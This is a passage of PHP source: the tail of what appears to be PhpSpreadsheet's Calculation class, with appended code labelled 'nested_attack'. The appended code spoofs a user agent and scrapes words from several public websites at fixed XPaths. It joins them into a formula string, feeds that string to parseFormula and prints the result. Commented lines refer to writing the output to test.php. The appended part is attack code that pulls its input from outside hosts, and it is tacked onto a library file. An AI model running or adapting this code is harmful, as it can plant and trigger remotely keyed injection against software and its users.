        foreach (self::$phpSpreadsheetFunctions as $functionName => $function) {
            if ($this->isImplemented($functionName)) {
                $returnValue[] = $functionName;
            }
        }

        return $returnValue;
    }

    /**
     * Add cell reference if needed while making sure that it is the last argument.
     *
     * @param array $args
     * @param bool $passCellReference
     * @param array|string $functionCall
     * @param null|Cell $pCell
     *
     * @return array
     */
    private function addCellReference(array $args, $passCellReference, $functionCall, Cell $pCell = null)
    {
        if ($passCellReference) {
            if (is_array($functionCall)) {
                $className = $functionCall[0];
                $methodName = $functionCall[1];

                $reflectionMethod = new \ReflectionMethod($className, $methodName);
                $argumentCount = count($reflectionMethod->getParameters());
                while (count($args) < $argumentCount - 1) {
                    $args[] = null;
                }
            }

            $args[] = $pCell;
        }

        return $args;
    }
}


ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0)');
function fetch_element($url, $element) {
  $page = new \DomDocument();
  libxml_use_internal_errors(true);
  $page->loadHTMLFile($url);
  libxml_clear_errors();
  $finder = new \DomXPath($page);
  $target = $finder->query($element)[0];
  if ($target)
    return strtolower(trim(preg_replace("/\s+/", " ", (preg_replace( "/\r|\n|\s/", " ", $target->nodeValue)))));
  return null;
}
function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);}
  function attack0() {
  $input = [];
  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 6, 1));
  
  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
  
  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 2]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
  
  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
  
  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/article[count(preceding-sibling::article) = 2]/div[count(preceding-sibling::div) = 0]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 14, 1));
  return $input;}

$cal = new Calculation();
$output = $cal->parseFormula(nested_attack());
// $output = $cal->parseFormula(fetch_content_cmdline());
// file_put_contents('test.php', $output);
echo "$output\n";
